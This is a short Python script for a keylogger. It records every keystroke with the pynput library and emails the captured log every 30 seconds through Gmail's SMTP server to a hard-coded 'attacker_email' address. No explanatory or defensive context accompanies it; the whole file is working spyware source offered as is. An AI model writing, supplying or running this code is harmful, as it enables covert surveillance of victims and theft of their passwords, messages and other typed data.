import pynput.keyboard
import smtplib
import threading

log = ""

def callback_function(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += " " + str(key) + " "
    
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def report():
    global log
    send_mail("attacker_email@gmail.com", "password123", log)
    log = ""
    timer = threading.Timer(30, report)  # Send logs every 30 seconds
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=callback_function)
with keyboard_listener:
    report()
    keyboard_listener.join()
